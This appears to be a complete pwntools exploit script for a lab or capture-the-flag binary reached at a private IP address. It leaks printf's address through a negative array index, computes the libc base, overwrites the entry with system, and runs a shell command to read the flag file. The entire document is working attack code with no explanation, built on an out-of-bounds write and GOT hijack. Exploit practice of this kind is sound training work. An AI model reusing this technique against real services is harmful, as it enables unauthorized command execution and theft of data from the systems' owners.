from pwn import *

glibc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

idx = -(0x4048 - 0x4020) // 8
assert idx == -5
# r = process("./share/lab")
r = remote("10.113.184.121", 10043)
r.recvuntil(b"idx: ")
r.sendline(str(idx).encode())
r.recvuntil(b"arr[-5] = ")
addr = int(r.recvline().strip())
base = addr - glibc.symbols["printf"]
# printf 0x606f0
ans = base + glibc.symbols["system"]
# system 0x50d70
assert base & 0xFFF == 0
r.recvuntil(b"val: ")
r.sendline(str(ans).encode())
r.sendline(b"cat /home/lab/flag")
print(r.recv().decode())
